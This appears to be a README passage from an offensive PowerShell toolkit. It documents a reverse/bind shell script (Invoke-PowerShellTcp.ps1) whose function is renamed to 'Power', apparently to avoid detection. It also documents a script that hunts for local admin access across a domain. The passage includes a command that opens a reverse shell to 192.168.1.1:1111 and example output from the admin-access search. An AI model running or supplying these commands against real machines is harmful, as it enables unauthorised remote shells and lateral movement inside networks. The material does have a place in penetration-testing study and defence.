## Interesting Tools

### `Invoke-PowerShellTcp.ps1`
---
Opens a shell. Modified Version of the original `Invoke-PowerShellTcp_Old.ps1`. Replacing the main function name to `Power`.

Parameters:
- `Reverse`: To open reverse shell
- `Bind` : Creates a bind shell
- `IPAddress`
- `Port`

Example:
```powershell
C:> . Invoke-PowerShellTcp.ps1      
C:> Power -Reverse -IPAddress 192.168.1.1 -Port 1111
```

### `Find-PSRemotingLocalAdminAccess.ps1`
---
To search for local admin access on machines in a domain or local network for the current user.
Parameters:
- `ComputerFile`: File with computers to check
- `StopOnSuccess`: Stops when found one
Example:
```powershell
PS C:> . .\Find-PSRemotingLocalAdminAccess.ps1       # Import module
PS C:> Find-PSRemotingLocalAdminAccess               # Run the function
COMPUTER-WITH-ACCESS
PS C:>
```
